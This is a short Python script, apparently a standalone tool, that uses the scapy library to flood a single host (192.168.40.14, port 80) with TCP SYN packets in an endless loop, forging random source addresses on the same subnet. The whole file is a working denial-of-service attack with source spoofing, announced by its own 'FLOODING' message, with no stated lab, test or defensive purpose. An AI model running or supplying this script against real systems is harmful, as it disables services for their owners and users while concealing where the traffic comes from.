from scapy.all import *
import random

target = "192.168.40.14"
port = 80

print(f"FLOODING {target}:{port} with SYN packets...")
print("Press CTRL+C to stop")

while True:
    src_ip = f"192.168.40.{random.randint(50,200)}"
    
    ip = IP(src=src_ip, dst=target)
    tcp = TCP(sport=random.randint(1024,65535), dport=port, flags="S")
    send(ip/tcp, verbose=False)